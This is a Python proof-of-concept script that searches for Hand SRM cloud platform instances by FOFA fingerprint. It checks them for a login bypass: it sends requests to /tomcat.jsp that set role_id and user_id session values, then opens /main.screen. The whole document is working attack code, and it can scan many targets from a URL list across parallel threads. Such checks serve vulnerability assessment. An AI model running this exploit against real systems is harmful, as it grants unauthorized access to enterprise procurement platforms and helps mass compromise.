#FOFA:app="汉得SRM云平台"

import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    try:
        session = requests.Session()
        payload1 = "/tomcat.jsp?dataName=role_id&dataValue=1"
        payload2 = "/tomcat.jsp?dataName=user_id&dataValue=1"
        payload3 = "/main.screen"
        res1 = session.get(target, verify=False)
        print(res1.status_code)
        if res1.status_code == 200:
            res2 = session.get(target+payload1, verify=False)
            print(res2.status_code)
            if res2.status_code == 200:
                res3 = session.get(target+payload2, verify=False)
                print(res3.status_code)
                if res3.status_code == 200:
                    res4 = session.get(target+payload3, verify=False)
                    print(res4.status_code)
                    if res4.status_code == 200:
                        print(f"{target}存在登录绕过")
                    else:
                        print(f"{target}不存在登录绕过")
                else:
                    print(f"{target}不存在登录绕过")
            else:
                print(f"{target}不存在登录绕过")
        else:
            print(f"{target}不存在登录绕过")

    except Exception as e:
        print(f"{target}网站访问失败，请手动确认")


def main():
    parser = argparse.ArgumentParser("汉得SRMtomcat.jsp登录绕过漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()